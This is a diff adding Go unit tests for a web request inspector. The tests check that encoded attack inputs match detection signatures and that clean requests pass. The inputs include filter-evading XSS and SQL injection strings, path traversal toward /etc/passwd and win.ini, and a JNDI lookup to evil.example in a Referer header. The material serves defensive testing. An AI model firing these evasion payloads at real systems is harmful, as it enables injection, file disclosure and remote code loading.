@@ -172,3 +172,80 @@ func TestMiddleware(t *testing.T) {
 		})
 	}
 }
+
+func TestInspectDetectsEvasion(t *testing.T) {
+	tests := []struct {
+		name   string
+		req    func() *http.Request
+		wantID string
+	}{
+		{"html entity xss in query", get("/?q=%26lt%3Bscript%26gt%3B"), "XSS-001"},
+		{"%u-encoded xss in query", get("/?q=%u003Cscript%u003E"), "XSS-001"},
+		{"fullwidth xss in query", get("/?q=%EF%BC%9Cscript%EF%BC%9E"), "XSS-001"},
+		{"null byte in keyword", get("/?q=%3Cscr%00ipt%3E"), "XSS-001"},
+		{"malformed escape before payload", get("/?q=%zz%3Cscript%3E"), "XSS-001"},
+		{"sql comment as space", get("/items?id=1/**/UNION/**/SELECT/**/1"), "SQLI-003"},
+		{"mysql versioned comment", get("/items?id=1+/*!50000UNION*/+/*!50000SELECT*/+1"), "SQLI-003"},
+		{"overlong utf-8 traversal", get("/static/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"), "PT-001"},
+		{"backslash traversal", get(`/download?file=..%5C..%5Cwindows%5Cwin.ini`), "PT-001"},
+		{
+			name: "js escape in json body",
+			req: func() *http.Request {
+				r := httptest.NewRequest("POST", "/api", strings.NewReader(`{"bio":"<script>alert(1)</script>"}`))
+				r.Header.Set("Content-Type", "application/json")
+				return r
+			},
+			wantID: "XSS-001",
+		},
+		{
+			name: "html entity in header",
+			req: func() *http.Request {
+				r := httptest.NewRequest("GET", "/", nil)
+				r.Header.Set("Referer", "&#x24;{jndi:ldap://evil.example/a}")
+				return r
+			},
+			wantID: "JNDI-001",
+		},
+	}
+
+	in := NewInspector(DefaultSignatures, 0)
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			m, err := in.Inspect(tc.req())
+			if err != nil {
+				t.Fatal(err)
+			}
+			if m == nil {
+				t.Fatal("expected a match, got none")
+			}
+			if m.Signature.ID != tc.wantID {
+				t.Errorf("got %s at %s, want %s", m.Signature.ID, m.Location, tc.wantID)
+			}
+		})
+	}
+}
+
+func TestInspectAllowsNormalizedCleanRequests(t *testing.T) {
+	in := NewInspector(DefaultSignatures, 0)
+	reqs := []*http.Request{
+		httptest.NewRequest("GET", "/login?next=https%3A%2F%2Fexample.com%2Fhome", nil),
+		httptest.NewRequest("GET", "/search?q=%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF", nil),
+		httptest.NewRequest("GET", "/docs/a.b/c..d", nil),
+		httptest.NewRequest("POST", "/api", strings.NewReader(`{"text":"5 > 3 & 2 < 4"}`)),
+	}
+	for _, r := range reqs {
+		r.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
+		r.Header.Set("Authorization", "Basic dXNlcjpwYXNz+/==")
+		m, err := in.Inspect(r)
+		if err != nil {
+			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
+		}
+		if m != nil {
+			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
+		}
+	}
+}
+
+func get(target string) func() *http.Request {
+	return func() *http.Request { return httptest.NewRequest("GET", target, nil) }
+}
